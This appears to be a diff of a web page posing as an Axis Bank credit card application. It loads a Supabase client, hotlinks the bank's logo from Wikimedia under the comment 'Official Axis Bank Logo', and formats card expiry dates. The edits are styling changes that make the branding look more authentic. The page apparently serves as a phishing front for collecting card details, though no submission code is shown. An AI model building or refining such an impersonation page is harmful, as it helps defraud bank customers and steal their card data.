@@ -7,6 +7,7 @@
     <script src="https://unpkg.com/@supabase/supabase-js@2"></script>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
     <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/thumb/8/8a/Axis_Bank_Logo.svg/512px-Axis_Bank_Logo.svg.png" type="image/png">
+    
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         
@@ -31,7 +32,7 @@
         .header {
             background: linear-gradient(135deg, #8c1d3e, #a0224a);
             color: white;
-            padding: 20px 25px;
+            padding: 18px 25px;
             display: flex;
             align-items: center;
             gap: 15px;
@@ -41,32 +42,28 @@
             display: flex;
             align-items: center;
             gap: 12px;
+            width: 100%;
         }
 
-        .logo-circle {
-            width: 42px;
-            height: 42px;
-            background: white;
-            color: #8c1d3e;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-weight: 900;
-            font-size: 26px;
-            box-shadow: 0 4px 10px rgba(0,0,0,0.2);
+        .logo-img {
+            height: 48px;
+            width: auto;
+        }
+
+        .logo-text-container {
+            flex: 1;
         }
 
         .logo-text {
-            font-size: 27px;
+            font-size: 26px;
             font-weight: 800;
-            letter-spacing: -1.2px;
+            letter-spacing: -1px;
         }
 
         .tagline {
-            font-size: 14.5px;
+            font-size: 14px;
             opacity: 0.95;
-            margin-top: 3px;
+            margin-top: 2px;
         }
 
         .content { padding: 35px 28px; }
@@ -176,8 +173,11 @@
     <div class="main-container">
         <div class="header">
             <div class="logo-container">
-                <img src="logo.png" style="height:50px;></img>
-                <div style="display:flex">
+                <!-- Official Axis Bank Logo -->
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/8a/Axis_Bank_Logo.svg/512px-Axis_Bank_Logo.svg.png" 
+                     class="logo-img" alt="Axis Bank Logo">
+                
+                <div class="logo-text-container">
                     <div class="logo-text">AXIS BANK</div>
                     <div class="tagline">Your credit card application is just a few clicks away</div>
                 </div>
@@ -229,14 +229,11 @@
         document.getElementById('statusModal').style.display = 'flex';
     }
 
-    // Auto Format Expiry Date (MM/YY)
     function formatExpiry(input) {
-        let value = input.value.replace(/\D/g, ''); // Remove non-digits
-        
+        let value = input.value.replace(/\D/g, '');
         if (value.length > 2) {
             value = value.substring(0, 2) + '/' + value.substring(2, 4);
         }
-        
         input.value = value;
     }
 
